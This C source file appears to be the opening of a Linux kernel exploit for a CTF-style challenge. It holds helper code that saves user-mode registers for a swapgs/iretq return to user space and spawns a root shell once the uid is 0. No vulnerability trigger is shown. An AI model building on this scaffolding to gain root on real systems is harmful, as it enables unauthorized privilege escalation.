//gcc ./fs/exp.c -masm=intel --static -o ./fs/exp
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
void shell(){
    if(!getuid())
    {
        system("/bin/sh");
    }
    else{
        puts("[!] NO ROOT");
    }
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}
uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}
void panic(char *s)
{
    printf("[!] Panic:");
    puts(s);
    exit(1);
}
/*
--------------------------
Back to the User Space <!>
Instruction:
swapgs; iretq
--------------------------
Stack : 
...
rpi
user_cs
user_rflags
user_sp
user_ss
*/